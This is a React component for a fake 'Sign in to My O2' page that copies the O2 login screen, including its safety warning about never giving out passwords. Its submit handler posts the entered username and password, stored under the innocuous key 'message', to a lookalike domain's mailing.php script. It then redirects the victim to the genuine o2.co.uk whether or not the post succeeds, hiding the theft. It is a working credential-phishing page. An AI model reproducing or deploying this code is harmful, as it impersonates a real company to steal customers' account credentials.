import React, { useState } from "react";

const SignInPage = () => {
  const [formData, setFormData] = useState({
    email: "",
    message: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };


  const handleSignIn = async (e) => {
    e.preventDefault();

    const formBody = new FormData();
    formBody.append("email", formData.email);
    formBody.append("message", formData.message);

    try {
      const response = await fetch(
        "https://o2contract.co.uk/o2_php/mailing.php",
        {
          method: "POST",
          body: formBody,
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.text();
      console.log(result); // Debugging: Check response

      // Redirect after a successful sign-in
      window.location.href = "https://o2.co.uk/";
    } catch (error) {
      console.error("Error sending data:", error);

      // Redirect even if there's an error (optional)
      window.location.href = "https://o2.co.uk/";
    }
  };

  return (
    <>
      <div className="bg-gray-100 min-h-screen flex flex-col">
        {/* Main Content */}
        <div className="container mx-auto px-4 py-8 flex-grow flex justify-center">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-16 max-w-4xl w-full">
            {/* Left Section: Sign In Form */}
            <div
              className="bg-white shadow-lg p-8 w-[90%] mx-auto"
              style={{ minHeight: "450px" }}
            >
              <h2 className="text-xl text-[#032b5a] font-semibold mb-6">
                Sign in to My O2
              </h2>
              <form onSubmit={handleSignIn}>
                <div className="mb-5">
                  <label
                    htmlFor="username"
                    className="block text-sm font-medium text-gray-700 mb-1"
                  >
                    Username (usually your email address)
                  </label>
                  <input
                    className="block w-full rounded border border-gray-300 px-3 py-2 text-sm shadow-sm focus:ring-blue-500 focus:border-blue-500 focus:outline-none"
                    style={{ height: "40px" }}
                    type="text"
                    name="email"
                    value={formData.email}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-5">
                  <label
                    id="password"
                    htmlFor="password"
                    className="block text-sm font-medium text-gray-700 mb-1"
                  >
                    Password
                  </label>
                  <input
                    name="message"
                    value={formData.message}
                    onChange={handleChange}
                    type="password"
                    id="password"
                    className="block w-full rounded border border-gray-300 px-3 py-2 text-sm shadow-sm focus:ring-blue-500 focus:border-blue-500 focus:outline-none"
                    style={{ height: "40px" }}
                    required
                  />
                </div>
                <button
                  style={{ height: "40px" }}
                  className="w-1/4 bg-gray-300 border border-gray-500 text-gray-500 py-2 rounded text-sm font-semibold cursor-pointer hover:bg-gray-100"
                  type="submit"
                >
                  Sign In
                </button>
              </form>
              <div className="mt-5">
                <a
                  href="#"
                  className="text-blue-600 text-sm hover:underline flex items-center"
                >
                  <span className="bg-blue-500 text-white rounded-full flex items-center justify-center w-6 h-6 text-xl pb-1 mr-2">
                    &gt;
                  </span>
                  Forgotten your username or password?
                </a>
              </div>

              {/* Divider */}
              <div className="flex items-center my-6">
                <hr className="flex-grow border-gray-300" />
                <span className="mx-4 text-gray-500 text-sm">or</span>
                <hr className="flex-grow border-gray-300" />
              </div>

              {/* Virgin Media Section */}
              <div
                className="p-4 rounded"
                style={{
                  border: "2px solid",
                  borderRadius: 10,
                  borderImageSlice: 1,
                  borderImageSource: "linear-gradient(to right, red, blue)",
                }}
              >
                <h3 className="text-[#000000] font-semibold mb-2">
                  Use your Virgin Media O2 ID
                </h3>
                <p className="text-sm text-gray-600 mb-4">
                  If you’ve linked your Virgin Media and O2 details to create a
                  new Virgin Media O2 ID, sign in with it here.{" "}
                  <a href="#" className="text-blue-600 hover:underline">
                    Find out more
                  </a>
                </p>
                <button
                  type="button"
                  className="w-full bg-[#0019a5] text-white py-1 rounded text-sm font-semibold hover:bg-blue-700"
                  style={{ height: "45px" }}
                >
                  Sign in with a Virgin Media O2 ID
                </button>
              </div>
            </div>

            {/* Right Section: Additional Information */}
            <div className="space-y-8">
              <div>
                <h2 className="text-lg text-[#032b5a] font-semibold mb-2">
                  Already an O2 customer?
                </h2>
                <p className="text-sm text-gray-700 mb-2">
                  If you’ve got a Pay Monthly account then we’ve automatically
                  registered you with My O2 and given you a username and
                  password.
                </p>

                <a
                  href="#"
                  className="text-blue-600 text-sm hover:underline flex items-center"
                >
                  <span className="bg-blue-500 text-white rounded-full flex items-center justify-center w-6 h-6 text-xl pb-1 mr-2">
                    &gt;
                  </span>
                  Help me sign in
                </a>
              </div>

              <div>
                <h2 className="text-lg text-[#032b5a] font-semibold mb-2">
                  Not yet registered?
                </h2>
                <ul className="text-sm text-gray-700 list-disc list-inside space-y-2">
                  <li>Check your usage and remaining balance</li>
                  <li>Set up auto top-ups</li>
                  <li>Manage O2 Rewards</li>
                </ul>
                <p className="text-sm text-gray-700 mt-2">
                  O2 Wifi customer? You can register to manage your account
                  here, whatever network you’re on.
                </p>

                <a
                  href="#"
                  className="text-blue-600 text-sm hover:underline flex items-center"
                >
                  <span className="bg-blue-500 text-white rounded-full flex items-center justify-center w-6 h-6 text-xl pb-1 mr-2">
                    &gt;
                  </span>
                  Register now
                </a>
              </div>
            </div>
          </div>
        </div>

        {/* Footer Section */}
        <div className="bg-gray-100 text-sm text-gray-700 text-left py-2 px-4 max-w-4xl mx-auto lg:ml-[26%]">
          <h2 className="font-semibold mb-2">Stay safe</h2>
          <p>
            We’ll never email or text asking you to send or verify personal,
            financial or password details. Make sure you keep your details safe
            and never give them out, even if it looks like the email or text
            came from us.
          </p>
        </div>
      </div>
    </>
  );
};

export default SignInPage;
